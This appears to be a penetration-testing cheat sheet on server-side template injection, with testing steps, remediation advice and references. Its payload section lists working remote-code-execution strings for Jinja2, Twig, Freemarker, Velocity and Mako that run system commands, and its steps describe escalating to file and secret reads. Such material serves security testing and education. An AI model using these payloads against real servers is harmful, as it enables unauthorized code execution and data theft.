# Server-Side Template Injection (SSTI)

## Overview
Server-Side Template Injection (SSTI) occurs when user input is embedded directly into a server-side template and evaluated by the template engine. Unlike XSS (client-side), SSTI runs on the server — meaning the attacker can execute arbitrary code on the server with the permissions of the web application process. SSTI is often mistakenly treated as a display bug but is typically a path to Remote Code Execution.

## How It Works
- Template engines (Jinja2, Twig, Freemarker, Velocity, Pebble, Mako, etc.) evaluate expressions like `{{ 7*7 }}` and render them as `49`.
- If user input lands inside a template string that is then rendered, the input is evaluated as template syntax.
- Attackers exploit the template engine's object model to traverse to dangerous objects (OS functions, class hierarchies) and execute system commands.

## Impact
- Remote Code Execution on the server.
- Reading server-side files (`/etc/passwd`, secret keys, environment variables).
- SSRF via template engine URL fetching.
- Pivoting to internal services.
- Denial of service via infinite loops or resource exhaustion in the template engine.

## Where to Look
- Error pages or 404 pages that reflect the requested URL in a rendered template.
- Email templates that include user-supplied content (names, subjects).
- PDF generation from user content.
- Marketing automation / CMS features with user-editable templates.
- Custom greeting or notification text that appears to be rendered server-side.
- Parameters like `name`, `subject`, `message`, `template`, `body` in any context.

## Testing Steps
1. Submit `{{7*7}}` — if the response contains `49`, Jinja2/Twig style injection is confirmed.
2. Submit `${7*7}` — for Freemarker/Velocity/EL injection.
3. Submit `<%= 7*7 %>` — for ERB (Ruby) injection.
4. Submit `#{7*7}` — for Ruby/Pebble.
5. If `49` appears, escalate to reading variables: `{{config}}`, `{{self.__dict__}}`.
6. Attempt RCE using the appropriate engine's object traversal technique (see payloads).
7. If math doesn't work, try string ops: `{{'a'*5}}` → `aaaaa`.
8. Test in all reflective input points — especially error templates.

## Payloads / Techniques
```
# Detection probe - triggers in multiple engines
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
{{7*'7'}}   # Jinja2: 7777777, Twig: 49

# Jinja2 (Python/Flask) RCE
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ ''.__class__.__mro__[1].__subclasses__()[<idx>].__init__.__globals__['os'].popen('id').read() }}

# Jinja2 - simplified via config
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Velocity (Java)
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))

# Mako (Python)
${self.module.cache.util.os.system("id")}
<%
import os
x=os.popen('id').read()
%>
${x}
```

## Burp Suite Tips
- In **Repeater**, test all reflective parameters with `{{7*7}}` before anything else.
- **Active Scanner** (Pro) detects SSTI in reflected parameters automatically.
- Use **Logger++** to catch template expression evaluation in responses at scale.
- The **SSTI Payload** list in SecLists: `Fuzzing/template-injection.txt`.
- After confirming with math probe, use Repeater to iteratively develop RCE payload.

## Tools
- tplmap — https://github.com/epinna/tplmap (automated SSTI exploitation)
- SSTImap — https://github.com/vladko312/SSTImap (updated fork)
- Burp Suite Active Scanner (Pro)
- SecLists SSTI wordlists

## Remediation
- Never pass user-controlled input directly to a template rendering function as part of the template string.
- Pass user data as template **variables** (context), not as template **syntax**.
  - BAD: `render_template_string("Hello " + username)` 
  - GOOD: `render_template_string("Hello {{ name }}", name=username)`
- Use a sandboxed template environment if custom templates must be allowed (but note: sandboxes can often be escaped).
- Validate and sanitize all input before any rendering operation.
- Restrict template functionality to the minimum required (disable `config`, `self`, raw Python access).

## References
https://portswigger.net/research/server-side-template-injection
https://portswigger.net/web-security/server-side-template-injection
https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-Side_Template_Injection
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
